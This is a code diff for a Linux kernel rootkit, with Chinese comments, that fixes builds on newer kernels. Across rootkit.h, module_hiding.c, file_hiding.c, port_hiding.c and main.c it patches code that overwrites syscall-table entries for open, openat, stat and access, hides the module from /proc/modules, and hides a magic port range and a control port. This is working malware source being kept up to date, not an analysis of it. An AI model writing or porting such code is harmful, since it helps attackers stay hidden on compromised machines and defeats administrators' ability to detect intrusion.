--- a/rootkit.h
+++ b/rootkit.h
@@ -33,7 +33,6 @@
 #include <linux/sched.h>
 #include <linux/pid.h>
-#include <linux/dirent.h>
 #include <linux/socket.h>
 #include <linux/in.h>
 #include <net/tcp.h>
@@ -39,6 +38,11 @@
 #include <net/sock.h>
 
+// 条件包含dirent.h以避免重复定义
+#if LINUX_VERSION_CODE >= KERNEL_VERSION(5,6,0)
+#include <linux/dirent.h>
+#endif
+
 // 通用定义
 #define MODULE_NAME "rootkit"
 
@@ -75,6 +79,8 @@
 
 // 通用数据结构
+// 只在内核版本小于5.6时定义linux_dirent64结构体
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 struct linux_dirent64 {
     u64 d_ino;
     s64 d_off;
@@ -82,6 +88,7 @@
     unsigned char d_type;
     char d_name[];
 };
+#endif
 
 struct linux_dirent {
     unsigned long d_ino;

--- a/module_hiding.c
+++ b/module_hiding.c
@@ -9,7 +9,9 @@
 extern struct list_head *module_previous;
 extern short module_hidden;
-extern struct module *THIS_MODULE;
+// THIS_MODULE已在内核头文件中定义，无需重复声明
 
-// 原始函数指针
+// 原始函数指针（仅在旧内核版本中使用）
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int (*original_proc_modules_show)(struct seq_file *m, void *v);
 static struct file_operations *original_proc_modules_fops;
+#endif
 
 // 模块隐藏相关函数
 static int is_hidden_module(const char *name);
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int hooked_proc_modules_show(struct seq_file *m, void *v);
+#endif
 static void hide_from_proc_modules(void);
 static void restore_proc_modules(void);
@@ -48,7 +52,8 @@
 }
 
-// Hook /proc/modules 显示函数
+// Hook /proc/modules 显示函数（仅在旧内核版本中使用）
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
 static int hooked_proc_modules_show(struct seq_file *m, void *v) {
     struct module *mod = list_entry(v, struct module, list);
 
@@ -60,6 +65,7 @@
     return original_proc_modules_show(m, v);
 }
+#endif
 
 // 从 /proc/modules 中隐藏
 static void hide_from_proc_modules(void) {
@@ -63,7 +69,8 @@
 // 从 /proc/modules 中隐藏
 static void hide_from_proc_modules(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
     struct proc_dir_entry *proc_modules;
     
-    // 查找 /proc/modules 条目
+    // 在较老的内核版本中使用proc_find_entry
     proc_modules = proc_find_entry("modules", NULL);
     if (!proc_modules) {
         printk(KERN_ERR "[rootkit] Failed to find /proc/modules\n");
@@ -79,6 +86,11 @@
     
     printk(KERN_INFO "[rootkit] Hooked /proc/modules\n");
+#else
+    // 在较新的内核版本中，proc_find_entry不再导出
+    // 使用替代方法或跳过此功能
+    printk(KERN_WARNING "[rootkit] /proc/modules hooking not supported in this kernel version\n");
+#endif
 }
 
 // 恢复 /proc/modules
 static void restore_proc_modules(void) {
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
     struct proc_dir_entry *proc_modules;
     
     proc_modules = proc_find_entry("modules", NULL);
@@ -100,6 +112,10 @@
        printk(KERN_INFO "[rootkit] Restored /proc/modules\n");
    }
+#else
+    // 在较新的内核版本中无需恢复
+    printk(KERN_INFO "[rootkit] /proc/modules restore not needed in this kernel version\n");
+#endif
 }

@@ -211,5 +223,9 @@
         module_hidden ? "Yes" : "No",
         "Partial", // sysfs隐藏状态
+#if LINUX_VERSION_CODE < KERNEL_VERSION(5,6,0)
         original_proc_modules_fops ? "Yes" : "No"
+#else
+        "Not Supported"
+#endif
     );

--- a/file_hiding.c
+++ b/file_hiding.c
@@ -442,5 +442,12 @@
    original_open = (void *)sys_call_table[__NR_open];
    original_openat = (void *)sys_call_table[__NR_openat];
+#ifdef __NR_newfstat
    original_stat = (void *)sys_call_table[__NR_newfstat];
+#elif defined(__NR_fstat)
+    original_stat = (void *)sys_call_table[__NR_fstat];
+#else
+    original_stat = NULL;
+    printk(KERN_WARNING "[rootkit] stat syscall not available\n");
+#endif
    original_access = (void *)sys_call_table[__NR_access];

--- a/port_hiding.c
+++ b/port_hiding.c
@@ -79,9 +79,5 @@
 static int is_magic_port(__be16 port);
 
-// 检查是否为魔术端口
-static int is_magic_port(__be16 port) {
-    __be16 host_port = ntohs(port);
-    return (host_port >= MAGIC_PORT_RANGE_START && host_port <= MAGIC_PORT_RANGE_END);
-}
+// 注意：is_magic_port函数已在rootkit.h中定义，这里不需要重复定义

--- a/main.c
+++ b/main.c
@@ -9,8 +9,8 @@
 
 // 全局变量
-static struct list_head *module_previous;
-static short module_hidden = 0;
+struct list_head *module_previous;
+short module_hidden = 0;
 static struct proc_dir_entry *proc_entry;
 
 // 隐藏的文件列表
@@ -71,6 +71,8 @@
 EXPORT_SYMBOL(disable_write_protection);
 EXPORT_SYMBOL(enable_write_protection);
+EXPORT_SYMBOL(module_previous);
+EXPORT_SYMBOL(module_hidden);
 
 // 查找系统调用表
 
 // 检查端口是否应该被隐藏
@@ -84,1 +84,1 @@
 static int should_hide_port(__be16 port) {
-    return is_magic_port(port) || ntohs(port) == ROOTKIT_PORT;
+    return is_magic_port(ntohs(port)) || ntohs(port) == CONTROL_PORT;
 }
@@ -448,4 +448,4 @@
     offset += snprintf(buffer + offset, size - offset,
                       "\nMagic Port Range: %d-%d\n",
-                      MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
+                      MAGIC_PORT_START, MAGIC_PORT_END);
     offset += snprintf(buffer + offset, size - offset,
-                      "Rootkit Control Port: %d\n", ROOTKIT_PORT);
+                      "Rootkit Control Port: %d\n", CONTROL_PORT);
@@ -495,7 +495,7 @@
     // 自动隐藏魔术端口范围
-    hide_port_range(htons(MAGIC_PORT_RANGE_START), htons(MAGIC_PORT_RANGE_END), 0);
+    hide_port_range(htons(MAGIC_PORT_START), htons(MAGIC_PORT_END), 0);
     
     // 隐藏rootkit控制端口
-    hide_port(htons(ROOTKIT_PORT), 0);
+    hide_port(htons(CONTROL_PORT), 0);
     
     printk(KERN_INFO "[rootkit] Port hiding subsystem initialized\n");
     printk(KERN_INFO "[rootkit] Magic port range: %d-%d\n", 
-           MAGIC_PORT_RANGE_START, MAGIC_PORT_RANGE_END);
-    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", ROOTKIT_PORT);
+           MAGIC_PORT_START, MAGIC_PORT_END);
+    printk(KERN_INFO "[rootkit] Rootkit control port: %d\n", CONTROL_PORT);
 
@@ -458,5 +465,9 @@
     sys_call_table[__NR_open] = (unsigned long)hooked_open;
     sys_call_table[__NR_openat] = (unsigned long)hooked_openat;
+#ifdef __NR_newfstat
     sys_call_table[__NR_newfstat] = (unsigned long)hooked_stat;
+#elif defined(__NR_fstat)
+    sys_call_table[__NR_fstat] = (unsigned long)hooked_stat;
+#endif
     sys_call_table[__NR_access] = (unsigned long)hooked_access;
     enable_write_protection();
 
@@ -485,6 +496,11 @@
         if (original_openat)
             sys_call_table[__NR_openat] = (unsigned long)original_openat;
-        if (original_stat)
+        if (original_stat) {
+#ifdef __NR_newfstat
             sys_call_table[__NR_newfstat] = (unsigned long)original_stat;
+#elif defined(__NR_fstat)
+            sys_call_table[__NR_fstat] = (unsigned long)original_stat;
+#endif
+        }
         if (original_access)
             sys_call_table[__NR_access] = (unsigned long)original_access;